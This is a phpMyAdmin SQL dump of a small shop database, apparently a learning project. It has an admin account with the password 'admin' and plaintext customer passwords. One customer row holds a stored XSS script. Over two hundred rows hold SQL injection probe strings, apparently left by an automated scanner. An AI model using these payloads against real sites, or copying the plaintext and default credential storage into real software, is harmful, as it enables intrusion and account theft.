-- phpMyAdmin SQL Dump
-- version 4.9.7deb1
-- https://www.phpmyadmin.net/
--
-- Host: localhost:3306
-- Generation Time: Dec 10, 2021 at 02:17 PM
-- Server version: 8.0.27-0ubuntu0.21.04.1
-- PHP Version: 7.4.16

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `cvsa`
--

-- --------------------------------------------------------

--
-- Table structure for table `admin`
--

CREATE TABLE `admin` (
  `id` int NOT NULL,
  `username` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `password` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `admin`
--

INSERT INTO `admin` (`id`, `username`, `password`) VALUES
(1, 'admin', 'admin');

-- --------------------------------------------------------

--
-- Table structure for table `categories`
--

CREATE TABLE `categories` (
  `cat_id` int NOT NULL,
  `cat_name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `categories`
--

INSERT INTO `categories` (`cat_id`, `cat_name`) VALUES
(1, 'Apple'),
(2, 'Samsung');

-- --------------------------------------------------------

--
-- Table structure for table `customers`
--

CREATE TABLE `customers` (
  `id` int NOT NULL,
  `username` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `password` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `first_name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `last_name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `customers`
--

INSERT INTO `customers` (`id`, `username`, `password`, `first_name`, `last_name`) VALUES
(1, 'az', 'password123', 'Azmol', 'Miah'),
(2, 'jdoe', 'password321', 'John', 'Doe'),
(3, 'idontcare', 'password123', 'Mike', 'Clare'),
(4, 'NotChris', '1234567890abc', 'Nunya', 'Beeswax'),
(5, 'easili', '20cog$E17', 'Li-Ming', 'Tan'),
(6, '<script id=\"xss\">alert(\"Attacked by XSS\");</script>', 'banana', 'yeee', 'hawww'),
(7, 'wtaG', '', 'Fvmz', ''),
(8, 'wtaG', '', 'Fvmz', ''),
(9, 'wtaG', '', 'Fvmz', ''),
(10, 'wtaG', '', 'Fvmz) AND 8392=1340 AND (2549=2549', ''),
(11, 'wtaG', '', 'Fvmz) AND 8904=8904 AND (6300=6300', ''),
(12, 'wtaG', '', 'Fvmz AND 2016=8280', ''),
(13, 'wtaG', '', 'Fvmz AND 8904=8904', ''),
(14, 'wtaG', '', 'Fvmz AND 3391=1630-- DqwO', ''),
(15, 'wtaG', '', 'Fvmz AND 8904=8904-- fdMc', ''),
(16, 'wtaG', '', '(SELECT (CASE WHEN (1487=7360) THEN 0x46766d7a ELSE (SELECT 7360 UNION SELECT 4688) END))', ''),
(17, 'wtaG', '', '(SELECT (CASE WHEN (8810=8810) THEN 0x46766d7a ELSE (SELECT 9481 UNION SELECT 4378) END))', ''),
(18, 'wtaG', '', '(SELECT CONCAT(CONCAT(0x7171767871,(CASE WHEN (9308=9308) THEN 0x31 ELSE 0x30 END)),0x7171787671))', ''),
(19, 'wtaG', '', 'Fvmz\" AND 7893=4301#', ''),
(20, 'wtaG', '', 'Fvmz\" AND 7198=7198#', ''),
(21, 'wtaG', '', 'Fvmz\") AND 6646=4630#', ''),
(22, 'wtaG', '', 'Fvmz\") AND 7198=7198#', ''),
(23, 'wtaG', '', 'Fvmz\")) AND 6366=1722#', ''),
(24, 'wtaG', '', 'Fvmz\")) AND 7198=7198#', ''),
(25, 'wtaG', '', 'Fvmz\"))) AND 7631=7170#', ''),
(26, 'wtaG', '', 'Fvmz\"))) AND 7198=7198#', ''),
(27, 'wtaG', '', 'Fvmz\")) AS kKYf WHERE 3540=3540 AND 2031=3415#', ''),
(28, 'wtaG', '', 'Fvmz\")) AS Vhag WHERE 1509=1509 AND 7198=7198#', ''),
(29, 'wtaG', '', 'Fvmz\") AS pFvq WHERE 7951=7951 AND 6818=1883#', ''),
(30, 'wtaG', '', 'Fvmz\") AS OMHH WHERE 8068=8068 AND 7198=7198#', ''),
(31, 'wtaG', '', 'Fvmz) AND 5117=8141#', ''),
(32, 'wtaG', '', 'Fvmz) AND 7198=7198#', ''),
(33, 'wtaG', '', 'Fvmz)) AND 9826=9328#', ''),
(34, 'wtaG', '', 'Fvmz)) AND 7198=7198#', ''),
(35, 'wtaG', '', 'Fvmz))) AND 5390=6450#', ''),
(36, 'wtaG', '', 'Fvmz))) AND 7198=7198#', ''),
(37, 'wtaG', '', 'Fvmz AND 3599=9108#', ''),
(38, 'wtaG', '', 'Fvmz AND 7198=7198#', ''),
(39, 'wtaG', '', 'Fvmz)) AS hnyd WHERE 2589=2589 AND 5141=7977#', ''),
(40, 'wtaG', '', 'Fvmz)) AS VNfS WHERE 7538=7538 AND 7198=7198#', ''),
(41, 'wtaG', '', 'Fvmz) AS sLLn WHERE 2613=2613 AND 9501=1233#', ''),
(42, 'wtaG', '', 'Fvmz) AS pZeI WHERE 5969=5969 AND 7198=7198#', ''),
(43, 'wtaG', '', 'Fvmz` WHERE 2542=2542 AND 9235=2549#', ''),
(44, 'wtaG', '', 'Fvmz` WHERE 5581=5581 AND 7198=7198#', ''),
(45, 'wtaG', '', 'Fvmz`) WHERE 6830=6830 AND 5725=6195#', ''),
(46, 'wtaG', '', 'Fvmz`) WHERE 2100=2100 AND 7198=7198#', ''),
(47, 'wtaG', '', '-9110', ''),
(48, 'wtaG', '', '-4637\" OR 7701=5531#', ''),
(49, 'wtaG', '', '-5839\" OR 6513=6513#', ''),
(50, 'wtaG', '', '-4443\") OR 1011=3998#', ''),
(51, 'wtaG', '', '-1397\") OR 6513=6513#', ''),
(52, 'wtaG', '', '-2229\")) OR 5317=8134#', ''),
(53, 'wtaG', '', '-2430\")) OR 6513=6513#', ''),
(54, 'wtaG', '', '-3979\"))) OR 5958=3352#', ''),
(55, 'wtaG', '', '-1167\"))) OR 6513=6513#', ''),
(56, 'wtaG', '', '-6245\")) AS DZIu WHERE 1583=1583 OR 7251=8247#', ''),
(57, 'wtaG', '', '-6984\")) AS JkFz WHERE 9050=9050 OR 6513=6513#', ''),
(58, 'wtaG', '', '-9869\") AS DAWx WHERE 3242=3242 OR 4012=4463#', ''),
(59, 'wtaG', '', '-5679\") AS WyQg WHERE 3117=3117 OR 6513=6513#', ''),
(60, 'wtaG', '', '-8598) OR 9062=6252#', ''),
(61, 'wtaG', '', '-4397) OR 6513=6513#', ''),
(62, 'wtaG', '', '-1585)) OR 8573=9075#', ''),
(63, 'wtaG', '', '-1226)) OR 6513=6513#', ''),
(64, 'wtaG', '', '-6273))) OR 5048=6684#', ''),
(65, 'wtaG', '', '-4265))) OR 6513=6513#', ''),
(66, 'wtaG', '', '-1050 OR 8196=4593#', ''),
(67, 'wtaG', '', '-6771 OR 6513=6513#', ''),
(68, 'wtaG', '', '-6141)) AS LlFn WHERE 1930=1930 OR 6389=5371#', ''),
(69, 'wtaG', '', '-6271)) AS XNSW WHERE 3453=3453 OR 6513=6513#', ''),
(70, 'wtaG', '', '-9897) AS srvu WHERE 4457=4457 OR 3931=4694#', ''),
(71, 'wtaG', '', '-5643) AS EKVj WHERE 7429=7429 OR 6513=6513#', ''),
(72, 'wtaG', '', 'Fvmz\" OR NOT 5263=6727#', ''),
(73, 'wtaG', '', 'Fvmz\" OR NOT 8688=8688#', ''),
(74, 'wtaG', '', 'Fvmz\") OR NOT 8949=4645#', ''),
(75, 'wtaG', '', 'Fvmz\") OR NOT 8688=8688#', ''),
(76, 'wtaG', '', 'Fvmz\")) OR NOT 9230=7576#', ''),
(77, 'wtaG', '', 'Fvmz\")) OR NOT 8688=8688#', ''),
(78, 'wtaG', '', 'Fvmz\"))) OR NOT 2853=8121#', ''),
(79, 'wtaG', '', 'Fvmz\"))) OR NOT 8688=8688#', ''),
(80, 'wtaG', '', 'Fvmz\")) AS HjCR WHERE 2710=2710 OR NOT 5268=7628#', ''),
(81, 'wtaG', '', 'Fvmz\")) AS jQsd WHERE 5442=5442 OR NOT 8688=8688#', ''),
(82, 'wtaG', '', 'Fvmz\") AS dfZs WHERE 9822=9822 OR NOT 2751=1332#', ''),
(83, 'wtaG', '', 'Fvmz\") AS uwMg WHERE 6007=6007 OR NOT 8688=8688#', ''),
(84, 'wtaG', '', 'Fvmz) OR NOT 3234=5204#', ''),
(85, 'wtaG', '', 'Fvmz) OR NOT 8688=8688#', ''),
(86, 'wtaG', '', 'Fvmz)) OR NOT 7655=5408#', ''),
(87, 'wtaG', '', 'Fvmz)) OR NOT 8688=8688#', ''),
(88, 'wtaG', '', 'Fvmz))) OR NOT 1862=9080#', ''),
(89, 'wtaG', '', 'Fvmz))) OR NOT 8688=8688#', ''),
(90, 'wtaG', '', 'Fvmz OR NOT 2277=6194#', ''),
(91, 'wtaG', '', 'Fvmz OR NOT 8688=8688#', ''),
(92, 'wtaG', '', 'Fvmz)) AS kNDL WHERE 2070=2070 OR NOT 5027=6533#', ''),
(93, 'wtaG', '', 'Fvmz)) AS HkHH WHERE 2109=2109 OR NOT 8688=8688#', ''),
(94, 'wtaG', '', 'Fvmz) AS koCD WHERE 8592=8592 OR NOT 3908=2209#', ''),
(95, 'wtaG', '', 'Fvmz) AS Jxxv WHERE 3198=3198 OR NOT 8688=8688#', ''),
(96, 'wtaG', '', 'Fvmz` WHERE 9450=9450 OR NOT 7870=1497#', ''),
(97, 'wtaG', '', 'Fvmz` WHERE 9666=9666 OR NOT 8688=8688#', ''),
(98, 'wtaG', '', 'Fvmz`) WHERE 3621=3621 OR NOT 7945=4560#', ''),
(99, 'wtaG', '', 'Fvmz`) WHERE 3669=3669 OR NOT 8688=8688#', ''),
(100, 'wtaG', '', 'Fvmz\" RLIKE (SELECT (CASE WHEN (7742=7772) THEN 0x46766d7a ELSE 0x28 END))-- iFKx', ''),
(101, 'wtaG', '', 'Fvmz\" RLIKE (SELECT (CASE WHEN (6112=6112) THEN 0x46766d7a ELSE 0x28 END))-- LevJ', ''),
(102, 'wtaG', '', 'Fvmz\") RLIKE (SELECT (CASE WHEN (3287=1726) THEN 0x46766d7a ELSE 0x28 END)) AND (\"iLnu\"=\"iLnu', ''),
(103, 'wtaG', '', 'Fvmz\") RLIKE (SELECT (CASE WHEN (6112=6112) THEN 0x46766d7a ELSE 0x28 END)) AND (\"LmJH\"=\"LmJH', ''),
(104, 'wtaG', '', 'Fvmz\")) RLIKE (SELECT (CASE WHEN (5917=5872) THEN 0x46766d7a ELSE 0x28 END)) AND ((\"NNed\"=\"NNed', ''),
(105, 'wtaG', '', 'Fvmz\")) RLIKE (SELECT (CASE WHEN (6112=6112) THEN 0x46766d7a ELSE 0x28 END)) AND ((\"Zojz\"=\"Zojz', ''),
(106, 'wtaG', '', 'Fvmz\"))) RLIKE (SELECT (CASE WHEN (3024=3895) THEN 0x46766d7a ELSE 0x28 END)) AND (((\"eDcI\"=\"eDcI', ''),
(107, 'wtaG', '', 'Fvmz\"))) RLIKE (SELECT (CASE WHEN (6112=6112) THEN 0x46766d7a ELSE 0x28 END)) AND (((\"tKXx\"=\"tKXx', ''),
(108, 'wtaG', '', 'Fvmz\" RLIKE (SELECT (CASE WHEN (7580=2956) THEN 0x46766d7a ELSE 0x28 END)) AND \"oqHI\"=\"oqHI', ''),
(109, 'wtaG', '', 'Fvmz\" RLIKE (SELECT (CASE WHEN (6112=6112) THEN 0x46766d7a ELSE 0x28 END)) AND \"SluP\"=\"SluP', ''),
(110, 'wtaG', '', 'Fvmz\") RLIKE (SELECT (CASE WHEN (7749=1461) THEN 0x46766d7a ELSE 0x28 END)) AND (\"wqqE\" LIKE \"wqqE', ''),
(111, 'wtaG', '', 'Fvmz\") RLIKE (SELECT (CASE WHEN (6112=6112) THEN 0x46766d7a ELSE 0x28 END)) AND (\"qHcb\" LIKE \"qHcb', ''),
(112, 'wtaG', '', 'Fvmz\")) RLIKE (SELECT (CASE WHEN (2938=2138) THEN 0x46766d7a ELSE 0x28 END)) AND ((\"bSHz\" LIKE \"bSHz', ''),
(113, 'wtaG', '', 'Fvmz\")) RLIKE (SELECT (CASE WHEN (6112=6112) THEN 0x46766d7a ELSE 0x28 END)) AND ((\"qVPF\" LIKE \"qVPF', ''),
(114, 'wtaG', '', 'Fvmz\"))) RLIKE (SELECT (CASE WHEN (7338=8611) THEN 0x46766d7a ELSE 0x28 END)) AND (((\"KIiE\" LIKE \"KIiE', ''),
(115, 'wtaG', '', 'Fvmz\"))) RLIKE (SELECT (CASE WHEN (6112=6112) THEN 0x46766d7a ELSE 0x28 END)) AND (((\"MFoL\" LIKE \"MFoL', ''),
(116, 'wtaG', '', 'Fvmz\" RLIKE (SELECT (CASE WHEN (7037=1218) THEN 0x46766d7a ELSE 0x28 END)) AND \"VUIQ\" LIKE \"VUIQ', ''),
(117, 'wtaG', '', 'Fvmz\" RLIKE (SELECT (CASE WHEN (6112=6112) THEN 0x46766d7a ELSE 0x28 END)) AND \"ZGcM\" LIKE \"ZGcM', ''),
(118, 'wtaG', '', 'Fvmz\")) AS IFzQ WHERE 4355=4355 RLIKE (SELECT (CASE WHEN (1210=2492) THEN 0x46766d7a ELSE 0x28 END))-- Xkvl', ''),
(119, 'wtaG', '', 'Fvmz\")) AS EhYP WHERE 1662=1662 RLIKE (SELECT (CASE WHEN (6112=6112) THEN 0x46766d7a ELSE 0x28 END))-- XfVJ', ''),
(120, 'wtaG', '', 'Fvmz\") AS eYJg WHERE 2901=2901 RLIKE (SELECT (CASE WHEN (3204=9784) THEN 0x46766d7a ELSE 0x28 END))-- zqAZ', ''),
(121, 'wtaG', '', 'Fvmz\") AS QCYT WHERE 7027=7027 RLIKE (SELECT (CASE WHEN (6112=6112) THEN 0x46766d7a ELSE 0x28 END))-- UbWc', ''),
(122, 'wtaG', '', 'Fvmz) RLIKE (SELECT (CASE WHEN (4948=9867) THEN 0x46766d7a ELSE 0x28 END))-- BVbC', ''),
(123, 'wtaG', '', 'Fvmz) RLIKE (SELECT (CASE WHEN (6112=6112) THEN 0x46766d7a ELSE 0x28 END))-- ILDW', ''),
(124, 'wtaG', '', 'Fvmz) RLIKE (SELECT (CASE WHEN (2377=6605) THEN 0x46766d7a ELSE 0x28 END)) AND (7381=7381', ''),
(125, 'wtaG', '', 'Fvmz) RLIKE (SELECT (CASE WHEN (6112=6112) THEN 0x46766d7a ELSE 0x28 END)) AND (1392=1392', ''),
(126, 'wtaG', '', 'Fvmz)) RLIKE (SELECT (CASE WHEN (1990=9529) THEN 0x46766d7a ELSE 0x28 END)) AND ((8358=8358', ''),
(127, 'wtaG', '', 'Fvmz)) RLIKE (SELECT (CASE WHEN (6112=6112) THEN 0x46766d7a ELSE 0x28 END)) AND ((2316=2316', ''),
(128, 'wtaG', '', 'Fvmz))) RLIKE (SELECT (CASE WHEN (1333=2622) THEN 0x46766d7a ELSE 0x28 END)) AND (((6358=6358', ''),
(129, 'wtaG', '', 'Fvmz))) RLIKE (SELECT (CASE WHEN (6112=6112) THEN 0x46766d7a ELSE 0x28 END)) AND (((7292=7292', ''),
(130, 'wtaG', '', 'Fvmz RLIKE (SELECT (CASE WHEN (2442=5704) THEN 0x46766d7a ELSE 0x28 END))', ''),
(131, 'wtaG', '', 'Fvmz RLIKE (SELECT (CASE WHEN (6112=6112) THEN 0x46766d7a ELSE 0x28 END))', ''),
(132, 'wtaG', '', 'Fvmz RLIKE (SELECT (CASE WHEN (6903=2624) THEN 0x46766d7a ELSE 0x28 END))-- AisK', ''),
(133, 'wtaG', '', 'Fvmz RLIKE (SELECT (CASE WHEN (6112=6112) THEN 0x46766d7a ELSE 0x28 END))-- USpH', ''),
(134, 'wtaG', '', 'Fvmz RLIKE (SELECT (CASE WHEN (2688=1788) THEN 0x46766d7a ELSE 0x28 END))# ANsC', ''),
(135, 'wtaG', '', 'Fvmz RLIKE (SELECT (CASE WHEN (6112=6112) THEN 0x46766d7a ELSE 0x28 END))# nQwG', ''),
(136, 'wtaG', '', 'Fvmz)) AS xITP WHERE 5609=5609 RLIKE (SELECT (CASE WHEN (8252=8412) THEN 0x46766d7a ELSE 0x28 END))-- WYmC', ''),
(137, 'wtaG', '', 'Fvmz)) AS ytWk WHERE 8372=8372 RLIKE (SELECT (CASE WHEN (6112=6112) THEN 0x46766d7a ELSE 0x28 END))-- PKSl', ''),
(138, 'wtaG', '', 'Fvmz) AS Pvhk WHERE 7329=7329 RLIKE (SELECT (CASE WHEN (8104=2473) THEN 0x46766d7a ELSE 0x28 END))-- kFFj', ''),
(139, 'wtaG', '', 'Fvmz) AS ibun WHERE 6701=6701 RLIKE (SELECT (CASE WHEN (6112=6112) THEN 0x46766d7a ELSE 0x28 END))-- abIA', ''),
(140, 'wtaG', '', 'Fvmz` WHERE 1132=1132 RLIKE (SELECT (CASE WHEN (5156=4353) THEN 0x46766d7a ELSE 0x28 END))-- SwRo', ''),
(141, 'wtaG', '', 'Fvmz` WHERE 9919=9919 RLIKE (SELECT (CASE WHEN (6112=6112) THEN 0x46766d7a ELSE 0x28 END))-- AFbG', ''),
(142, 'wtaG', '', 'Fvmz`) WHERE 4614=4614 RLIKE (SELECT (CASE WHEN (2258=1288) THEN 0x46766d7a ELSE 0x28 END))-- jEZO', ''),
(143, 'wtaG', '', 'Fvmz`) WHERE 8203=8203 RLIKE (SELECT (CASE WHEN (6112=6112) THEN 0x46766d7a ELSE 0x28 END))-- iRut', ''),
(144, 'wtaG', '', 'Fvmz\" AND MAKE_SET(7332=5297,5297)-- pfYp', ''),
(145, 'wtaG', '', 'Fvmz\" AND MAKE_SET(1728=1728,1280)-- FivM', ''),
(146, 'wtaG', '', 'Fvmz\") AND MAKE_SET(8070=3708,3708) AND (\"dxwq\"=\"dxwq', ''),
(147, 'wtaG', '', 'Fvmz\") AND MAKE_SET(1728=1728,1280) AND (\"cbWl\"=\"cbWl', ''),
(148, 'wtaG', '', 'Fvmz\")) AND MAKE_SET(6545=8297,8297) AND ((\"Hcwu\"=\"Hcwu', ''),
(149, 'wtaG', '', 'Fvmz\")) AND MAKE_SET(1728=1728,1280) AND ((\"kqTE\"=\"kqTE', ''),
(150, 'wtaG', '', 'Fvmz\"))) AND MAKE_SET(2637=1143,1143) AND (((\"YAFy\"=\"YAFy', ''),
(151, 'wtaG', '', 'Fvmz\"))) AND MAKE_SET(1728=1728,1280) AND (((\"ZxXM\"=\"ZxXM', ''),
(152, 'wtaG', '', 'Fvmz\" AND MAKE_SET(9413=1223,1223) AND \"Nezh\"=\"Nezh', ''),
(153, 'wtaG', '', 'Fvmz\" AND MAKE_SET(1728=1728,1280) AND \"GQVB\"=\"GQVB', ''),
(154, 'wtaG', '', 'Fvmz\") AND MAKE_SET(6319=9110,9110) AND (\"OQnb\" LIKE \"OQnb', ''),
(155, 'wtaG', '', 'Fvmz\") AND MAKE_SET(1728=1728,1280) AND (\"YTPf\" LIKE \"YTPf', ''),
(156, 'wtaG', '', 'Fvmz\")) AND MAKE_SET(5229=3864,3864) AND ((\"aJni\" LIKE \"aJni', ''),
(157, 'wtaG', '', 'Fvmz\")) AND MAKE_SET(1728=1728,1280) AND ((\"LAfq\" LIKE \"LAfq', ''),
(158, 'wtaG', '', 'Fvmz\"))) AND MAKE_SET(1962=5893,5893) AND (((\"ScsP\" LIKE \"ScsP', ''),
(159, 'wtaG', '', 'Fvmz\"))) AND MAKE_SET(1728=1728,1280) AND (((\"FTcA\" LIKE \"FTcA', ''),
(160, 'wtaG', '', 'Fvmz\" AND MAKE_SET(9217=1014,1014) AND \"mTqF\" LIKE \"mTqF', ''),
(161, 'wtaG', '', 'Fvmz\" AND MAKE_SET(1728=1728,1280) AND \"GhFe\" LIKE \"GhFe', ''),
(162, 'wtaG', '', 'Fvmz\")) AS NiDf WHERE 2494=2494 AND MAKE_SET(3670=4364,4364)-- ygEM', ''),
(163, 'wtaG', '', 'Fvmz\")) AS neZz WHERE 3789=3789 AND MAKE_SET(1728=1728,1280)-- lJwc', ''),
(164, 'wtaG', '', 'Fvmz\") AS rqVk WHERE 6538=6538 AND MAKE_SET(1633=5725,5725)-- MoUb', ''),
(165, 'wtaG', '', 'Fvmz\") AS CSMA WHERE 9573=9573 AND MAKE_SET(1728=1728,1280)-- Ldpq', ''),
(166, 'wtaG', '', 'Fvmz\"=\"Fvmz\" AND MAKE_SET(4926=9576,9576) AND \"Fvmz\"=\"Fvmz', ''),
(167, 'wtaG', '', 'Fvmz\"=\"Fvmz\" AND MAKE_SET(1728=1728,1280) AND \"Fvmz\"=\"Fvmz', ''),
(168, 'wtaG', '', 'Fvmz) AND MAKE_SET(3974=3395,3395)-- xkHt', ''),
(169, 'wtaG', '', 'Fvmz) AND MAKE_SET(1728=1728,1280)-- WcSd', ''),
(170, 'wtaG', '', 'Fvmz) AND MAKE_SET(8417=7891,7891) AND (1065=1065', ''),
(171, 'wtaG', '', 'Fvmz) AND MAKE_SET(1728=1728,1280) AND (3405=3405', ''),
(172, 'wtaG', '', 'Fvmz)) AND MAKE_SET(2994=2873,2873) AND ((8402=8402', ''),
(173, 'wtaG', '', 'Fvmz)) AND MAKE_SET(1728=1728,1280) AND ((1925=1925', ''),
(174, 'wtaG', '', 'Fvmz))) AND MAKE_SET(1808=1600,1600) AND (((3100=3100', ''),
(175, 'wtaG', '', 'Fvmz))) AND MAKE_SET(1728=1728,1280) AND (((5493=5493', ''),
(176, 'wtaG', '', 'Fvmz AND MAKE_SET(6656=1108,1108)', ''),
(177, 'wtaG', '', 'Fvmz AND MAKE_SET(1728=1728,1280)', ''),
(178, 'wtaG', '', 'Fvmz AND MAKE_SET(2729=5186,5186)-- jdSo', ''),
(179, 'wtaG', '', 'Fvmz AND MAKE_SET(1728=1728,1280)-- lWDQ', ''),
(180, 'wtaG', '', 'Fvmz AND MAKE_SET(6419=8750,8750)# iCdp', ''),
(181, 'wtaG', '', 'Fvmz AND MAKE_SET(1728=1728,1280)# mhlf', ''),
(182, 'wtaG', '', 'Fvmz)) AS bXPE WHERE 7912=7912 AND MAKE_SET(3045=4125,4125)-- eSAr', ''),
(183, 'wtaG', '', 'Fvmz)) AS Qpxs WHERE 5679=5679 AND MAKE_SET(1728=1728,1280)-- cBGc', ''),
(184, 'wtaG', '', 'Fvmz) AS muAu WHERE 4509=4509 AND MAKE_SET(5864=8430,8430)-- uUgx', ''),
(185, 'wtaG', '', 'Fvmz) AS ctip WHERE 8675=8675 AND MAKE_SET(1728=1728,1280)-- JCXu', ''),
(186, 'wtaG', '', 'Fvmz` WHERE 8122=8122 AND MAKE_SET(4413=8535,8535)-- uYoy', ''),
(187, 'wtaG', '', 'Fvmz` WHERE 6412=6412 AND MAKE_SET(1728=1728,1280)-- exgh', ''),
(188, 'wtaG', '', 'Fvmz`) WHERE 5667=5667 AND MAKE_SET(8673=3557,3557)-- ZEUq', ''),
(189, 'wtaG', '', 'Fvmz`) WHERE 2179=2179 AND MAKE_SET(1728=1728,1280)-- ZJmp', ''),
(190, 'wtaG', '', 'Fvmz`=`Fvmz` AND MAKE_SET(4156=7972,7972) AND `Fvmz`=`Fvmz', ''),
(191, 'wtaG', '', 'Fvmz`=`Fvmz` AND MAKE_SET(1728=1728,1280) AND `Fvmz`=`Fvmz', ''),
(192, 'wtaG', '', 'Fvmz]-(SELECT 0 WHERE 1119=1119 AND MAKE_SET(6255=7773,7773))|[Fvmz', ''),
(193, 'wtaG', '', 'Fvmz]-(SELECT 0 WHERE 4998=4998 AND MAKE_SET(1728=1728,1280))|[Fvmz', ''),
(194, 'wtaG', '', '-5281\" OR MAKE_SET(5284=2729,2729)-- wmQw', ''),
(195, 'wtaG', '', '-2556\" OR MAKE_SET(4857=4857,1036)-- JEeY', ''),
(196, 'wtaG', '', '1', ''),
(197, 'wtaG', '', '1', ''),
(198, 'wtaG', '', '1', ''),
(199, 'wtaG', '', '1', ''),
(200, 'wtaG', '', '-8038\") OR MAKE_SET(3062=3550,3550) AND (\"wcUR\"=\"wcUR', ''),
(201, 'wtaG', '', '-3321\") OR MAKE_SET(4857=4857,1036) AND (\"eLJl\"=\"eLJl', ''),
(202, 'wtaG', '', '-8362\")) OR MAKE_SET(4207=9315,9315) AND ((\"SiId\"=\"SiId', ''),
(203, 'wtaG', '', '-5569\")) OR MAKE_SET(4857=4857,1036) AND ((\"IGeA\"=\"IGeA', ''),
(204, 'wtaG', '', '-7743\"))) OR MAKE_SET(2773=6475,6475) AND (((\"CYFe\"=\"CYFe', ''),
(205, 'wtaG', '', '-4843\"))) OR MAKE_SET(4857=4857,1036) AND (((\"IqHl\"=\"IqHl', ''),
(206, 'wtaG', '', '-6987\" OR MAKE_SET(6486=6796,6796) AND \"IBko\"=\"IBko', ''),
(207, 'wtaG', '', '-1872\" OR MAKE_SET(4857=4857,1036) AND \"VhXd\"=\"VhXd', ''),
(208, 'wtaG', '', '-7057\") OR MAKE_SET(1956=7823,7823) AND (\"ZdTD\" LIKE \"ZdTD', ''),
(209, 'wtaG', '', '-9612\") OR MAKE_SET(4857=4857,1036) AND (\"ZWpz\" LIKE \"ZWpz', ''),
(210, 'wtaG', '', '-8201\")) OR MAKE_SET(4362=7275,7275) AND ((\"zMjK\" LIKE \"zMjK', ''),
(211, 'wtaG', '', '-6816\")) OR MAKE_SET(4857=4857,1036) AND ((\"RWtJ\" LIKE \"RWtJ', ''),
(212, 'wtaG', '', '-2473\"))) OR MAKE_SET(7221=9974,9974) AND (((\"gDLr\" LIKE \"gDLr', ''),
(213, 'wtaG', '', '-5764\"))) OR MAKE_SET(4857=4857,1036) AND (((\"rqVZ\" LIKE \"rqVZ', ''),
(214, 'wtaG', '', '-5990\" OR MAKE_SET(3786=4400,4400) AND \"Noeq\" LIKE \"Noeq', ''),
(215, 'wtaG', '', '-8671\" OR MAKE_SET(4857=4857,1036) AND \"wrkv\" LIKE \"wrkv', ''),
(216, 'wtaG', '', '1', ''),
(217, 'wtaG', '', '1', ''),
(218, 'wtaG', '', '-9694\")) AS tUny WHERE 4730=4730 OR MAKE_SET(5310=1590,1590)-- Kzrp', ''),
(219, 'wtaG', '', '-5228\")) AS CDZO WHERE 5404=5404 OR MAKE_SET(4857=4857,1036)-- ggYB', ''),
(220, 'wtaG', '', '-5016\") AS Dhxj WHERE 5315=5315 OR MAKE_SET(7036=9666,9666)-- OSNW', ''),
(221, 'wtaG', '', '-6197\") AS jQuF WHERE 9855=9855 OR MAKE_SET(4857=4857,1036)-- kpHs', ''),
(222, 'wtaG', '', '-3301) OR MAKE_SET(2827=9757,9757)-- fnEl', ''),
(223, 'wtaG', '', '-2728) OR MAKE_SET(4857=4857,1036)-- uIew', ''),
(224, 'wtaG', '', '-7109) OR MAKE_SET(1158=7119,7119) AND (6557=6557', ''),
(225, 'wtaG', '', '-4038) OR MAKE_SET(4857=4857,1036) AND (6670=6670', ''),
(226, 'wtaG', '', '-4382)) OR MAKE_SET(5722=1256,1256) AND ((2813=2813', ''),
(227, 'wtaG', '', '-4957)) OR MAKE_SET(4857=4857,1036) AND ((3203=3203', ''),
(228, 'wtaG', '', '-8791))) OR MAKE_SET(3953=1303,1303) AND (((9142=9142', ''),
(229, 'wtaG', '', '-6348))) OR MAKE_SET(4857=4857,1036) AND (((1173=1173', ''),
(230, 'wtaG', '', '-3720 OR MAKE_SET(9248=5794,5794)', ''),
(231, 'wtaG', '', '-4484 OR MAKE_SET(4857=4857,1036)', ''),
(232, 'wtaG', '', '-8523 OR MAKE_SET(5051=7150,7150)-- FlSh', ''),
(233, 'wtaG', '', '-9963 OR MAKE_SET(4857=4857,1036)-- cPvb', ''),
(234, 'wtaG', '', '-5092 OR MAKE_SET(2429=9849,9849)# xLLc', ''),
(235, 'wtaG', '', '-2961 OR MAKE_SET(4857=4857,1036)# HJwB', ''),
(236, 'wtaG', '', '-2471)) AS fUAu WHERE 1155=1155 OR MAKE_SET(6367=7846,7846)-- ArMU', ''),
(237, 'wtaG', '', '-3825)) AS zIfR WHERE 2088=2088 OR MAKE_SET(4857=4857,1036)-- ZmsN', ''),
(238, 'wtaG', '', '-6891) AS NnRY WHERE 4727=4727 OR MAKE_SET(1385=2331,2331)-- nYpk', ''),
(239, 'wtaG', '', '-8593) AS JpKx WHERE 7028=7028 OR MAKE_SET(4857=4857,1036)-- tdPK', ''),
(240, 'wtaG', '', 'Fvmz\" AND ELT(1372=3495,3495)-- pcPI', ''),
(241, 'wtaG', '', 'Fvmz\" AND ELT(9646=9646,2273)-- WfLn', ''),
(242, 'wtaG', '', 'Fvmz\") AND ELT(4621=4990,4990) AND (\"YDaK\"=\"YDaK', ''),
(243, 'wtaG', '', 'Fvmz\") AND ELT(9646=9646,2273) AND (\"QITy\"=\"QITy', ''),
(244, 'wtaG', '', 'Fvmz\")) AND ELT(2192=2935,2935) AND ((\"SaKv\"=\"SaKv', ''),
(245, 'wtaG', '', 'Fvmz\")) AND ELT(9646=9646,2273) AND ((\"QdFE\"=\"QdFE', ''),
(246, 'wtaG', '', 'Fvmz\"))) AND ELT(6742=3723,3723) AND (((\"GcvB\"=\"GcvB', ''),
